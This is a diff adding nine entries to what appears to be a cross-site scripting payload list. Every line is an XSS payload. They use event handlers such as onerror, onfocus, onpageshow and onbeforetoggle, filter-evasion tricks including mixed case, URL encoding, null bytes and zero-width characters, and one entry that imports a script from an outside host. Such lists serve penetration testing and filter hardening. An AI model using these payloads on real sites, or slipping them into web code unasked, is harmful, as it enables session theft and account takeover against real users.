@@ -67,6 +67,15 @@ alert(document['cookie'])
 <svg/onload=parent[/al/.source.concat(/ert/.source)] (2)>
 "><img src=x onafterprint=prompt(document.domain);>
 <img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<img hrEF="0" sRC="data:0," oNLy=1 oNErrOR​=console.log1>
+1%27/prompt?.(1)/%27
+"><body/oNpagEshoW=(confirm)(document.domain)>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert1 //
+"*prompt(document.domain)*"
+"><img src=x onerrora=confirm() onerror=confirm(1)> 
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 "><div onpointerrawupdate="console.log('XSS')">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>
 "><div onpointerrawupdate="console.log('XSS')"></div><!--
 <video onloadstart=alert()><source></*>
